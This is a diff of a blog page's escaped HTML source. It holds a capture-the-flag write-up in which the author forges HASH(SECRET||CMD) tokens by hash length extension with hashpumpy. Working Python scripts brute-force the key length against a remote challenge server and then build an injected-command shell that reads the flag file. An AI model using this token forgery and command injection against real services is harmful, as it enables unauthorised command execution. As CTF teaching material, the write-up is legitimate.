+&lt;/code>&lt;/pre>&lt;/div>&lt;p>It executes the command we give it, given that we know the corresponding hash. The challenge description told us that the hash format is &lt;code>HASH(SECRET || CMD)&lt;/code>.&lt;/p>
 &lt;p>This should instantly make us think of &lt;a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">hash key length extension attacks&lt;/a>. I&amp;rsquo;ve written about this previously, for the &lt;a href="https://nicolasb.fr/blog/writeup-dghack-stickitup/">DG&amp;rsquo;hAck StickItUp challenge&lt;/a>.&lt;/p>
 &lt;p>This attack allows us to append arbitrary data at the end of an hashed value, while keeping the hash valid. Here, we can append &lt;code> ; my_command&lt;/code> to the existing command to execute what we want.&lt;/p>
 &lt;p>We&amp;rsquo;ll use the same tool: &lt;a href="https://github.com/bwall/HashPump">hashpump&lt;/a>. First, we have to figure out the key length. The service returned &lt;code>Bad Token&lt;/code> when we tried to pass the &lt;code>ls&lt;/code> hash for the &lt;code>whoami&lt;/code> command, so let&amp;rsquo;s use that.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># To remove warnings from hashpumpy ; https://stackoverflow.com/a/879249/6262617&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> warnings
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warnings&lt;span style="color:#f92672">.&lt;/span>filterwarnings(&lt;span style="color:#e6db74">&amp;#34;ignore&amp;#34;&lt;/span>, category&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">DeprecationWarning&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> hashpumpy
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># To remove remote(...) logs&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ID_HASH &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_output&lt;/span>(token, command):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">27099&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(ID_HASH &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>sendline(command &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;|&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> token&lt;span style="color:#f92672">.&lt;/span>encode())
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Bad Token&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> key_len &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">100&lt;/span>):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Could also have used the `ls` hash.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token, command &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(ID_HASH, &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39; ; echo 1&amp;#39;&lt;/span>, key_len)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> get_output(token, command)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> output:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(key_len, &lt;span style="color:#e6db74">&amp;#39;OK&amp;#39;&lt;/span>, output)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(key_len, &lt;span style="color:#e6db74">&amp;#39;FAIL&amp;#39;&lt;/span>)
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python fuzz.py
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">9&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">10&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">11&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">12&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">13&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">14&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">15&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">16&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">17&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">18&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">19&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">20&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">21&lt;/span> FAIL
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">22&lt;/span> OK b&lt;span style="color:#e6db74">&amp;#39;\nuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n1\n&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see, we successfully injected our &lt;code>echo 1&lt;/code> command. We get its output right after the output of the &lt;code>id&lt;/code> command.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># To remove warnings from hashpumpy ; https://stackoverflow.com/a/879249/6262617&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> warnings
+warnings&lt;span style="color:#f92672">.&lt;/span>filterwarnings(&lt;span style="color:#e6db74">&amp;#34;ignore&amp;#34;&lt;/span>, category&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">DeprecationWarning&lt;/span>)
+&lt;span style="color:#f92672">import&lt;/span> hashpumpy
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;span style="color:#75715e"># To remove remote(...) logs&lt;/span>
+context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
+ID_HASH &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a&amp;#39;&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_output&lt;/span>(token, command):
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">27099&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(ID_HASH &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(command &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;|&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> token&lt;span style="color:#f92672">.&lt;/span>encode())
+data &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Bad Token&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data:
+&lt;span style="color:#66d9ef">return&lt;/span> None
+&lt;span style="color:#66d9ef">return&lt;/span> data
+&lt;span style="color:#66d9ef">for&lt;/span> key_len &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">100&lt;/span>):
+&lt;span style="color:#75715e"># Could also have used the `ls` hash.&lt;/span>
+token, command &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(ID_HASH, &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39; ; echo 1&amp;#39;&lt;/span>, key_len)
+output &lt;span style="color:#f92672">=&lt;/span> get_output(token, command)
+&lt;span style="color:#66d9ef">if&lt;/span> output:
+&lt;span style="color:#66d9ef">print&lt;/span>(key_len, &lt;span style="color:#e6db74">&amp;#39;OK&amp;#39;&lt;/span>, output)
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(key_len, &lt;span style="color:#e6db74">&amp;#39;FAIL&amp;#39;&lt;/span>)
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fuzz.py
+&lt;span style="color:#ae81ff">0&lt;/span> FAIL
+&lt;span style="color:#ae81ff">1&lt;/span> FAIL
+&lt;span style="color:#ae81ff">2&lt;/span> FAIL
+&lt;span style="color:#ae81ff">3&lt;/span> FAIL
+&lt;span style="color:#ae81ff">4&lt;/span> FAIL
+&lt;span style="color:#ae81ff">5&lt;/span> FAIL
+&lt;span style="color:#ae81ff">6&lt;/span> FAIL
+&lt;span style="color:#ae81ff">7&lt;/span> FAIL
+&lt;span style="color:#ae81ff">8&lt;/span> FAIL
+&lt;span style="color:#ae81ff">9&lt;/span> FAIL
+&lt;span style="color:#ae81ff">10&lt;/span> FAIL
+&lt;span style="color:#ae81ff">11&lt;/span> FAIL
+&lt;span style="color:#ae81ff">12&lt;/span> FAIL
+&lt;span style="color:#ae81ff">13&lt;/span> FAIL
+&lt;span style="color:#ae81ff">14&lt;/span> FAIL
+&lt;span style="color:#ae81ff">15&lt;/span> FAIL
+&lt;span style="color:#ae81ff">16&lt;/span> FAIL
+&lt;span style="color:#ae81ff">17&lt;/span> FAIL
+&lt;span style="color:#ae81ff">18&lt;/span> FAIL
+&lt;span style="color:#ae81ff">19&lt;/span> FAIL
+&lt;span style="color:#ae81ff">20&lt;/span> FAIL
+&lt;span style="color:#ae81ff">21&lt;/span> FAIL
+&lt;span style="color:#ae81ff">22&lt;/span> OK b&lt;span style="color:#e6db74">&amp;#39;\nuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n1\n&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see, we successfully injected our &lt;code>echo 1&lt;/code> command. We get its output right after the output of the &lt;code>id&lt;/code> command.&lt;/p>
 &lt;p>We can now build ourselves a simple shell:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># To remove pesky warnings ; https://stackoverflow.com/a/879249/6262617&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> warnings
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warnings&lt;span style="color:#f92672">.&lt;/span>filterwarnings(&lt;span style="color:#e6db74">&amp;#34;ignore&amp;#34;&lt;/span>, category&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">DeprecationWarning&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> hashpumpy
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># To remove remote(...) logs&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ID_HASH &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KEY_LEN &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_output&lt;/span>(token, command):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">27099&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(ID_HASH &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>sendline(command &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;|&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> token&lt;span style="color:#f92672">.&lt;/span>encode())
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Bad Token&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">inject_command&lt;/span>(command):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> injected_command &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;; &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>command&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token, command &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(ID_HASH, &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>, injected_command, KEY_LEN)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> get_output(token, command)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> output&lt;span style="color:#f92672">.&lt;/span>decode()&lt;span style="color:#f92672">.&lt;/span>strip()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Remove original &amp;#39;id&amp;#39; output&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(output&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>:])
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> output
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cmd &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#39;$ &amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> cmd:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(inject_command(cmd))
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python demo.py
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ whoami
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ctf
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat /home/ctf/flag.txt
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CYBERTF&lt;span style="color:#f92672">{&lt;/span>HM@C_Custom_Is_Bad_Idea&lt;span style="color:#f92672">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{HM@C_Custom_Is_Bad_Idea}&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># To remove pesky warnings ; https://stackoverflow.com/a/879249/6262617&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> warnings
+warnings&lt;span style="color:#f92672">.&lt;/span>filterwarnings(&lt;span style="color:#e6db74">&amp;#34;ignore&amp;#34;&lt;/span>, category&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">DeprecationWarning&lt;/span>)
+&lt;span style="color:#f92672">import&lt;/span> hashpumpy
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;span style="color:#75715e"># To remove remote(...) logs&lt;/span>
+context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
+ID_HASH &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a&amp;#39;&lt;/span>
+KEY_LEN &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_output&lt;/span>(token, command):
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">27099&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(ID_HASH &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(command &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;|&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> token&lt;span style="color:#f92672">.&lt;/span>encode())
+data &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Bad Token&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data:
+&lt;span style="color:#66d9ef">return&lt;/span> None
+&lt;span style="color:#66d9ef">return&lt;/span> data
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">inject_command&lt;/span>(command):
+injected_command &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#e6db74">&amp;#39;; {command}&amp;#39;&lt;/span>
+token, command &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(ID_HASH, &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>, injected_command, KEY_LEN)
+output &lt;span style="color:#f92672">=&lt;/span> get_output(token, command)
+output &lt;span style="color:#f92672">=&lt;/span> output&lt;span style="color:#f92672">.&lt;/span>decode()&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;span style="color:#75715e"># Remove original &amp;#39;id&amp;#39; output&lt;/span>
+output &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(output&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>:])
+&lt;span style="color:#66d9ef">return&lt;/span> output
+&lt;span style="color:#66d9ef">while&lt;/span> True:
+&lt;span style="color:#66d9ef">try&lt;/span>:
+cmd &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#39;$ &amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> cmd:
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(inject_command(cmd))
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python demo.py
+$ whoami
+ctf
+$ cat /home/ctf/flag.txt
+CYBERTF&lt;span style="color:#f92672">{&lt;/span>HM@C_Custom_Is_Bad_Idea&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{HM@C_Custom_Is_Bad_Idea}&lt;/code>.&lt;/p>
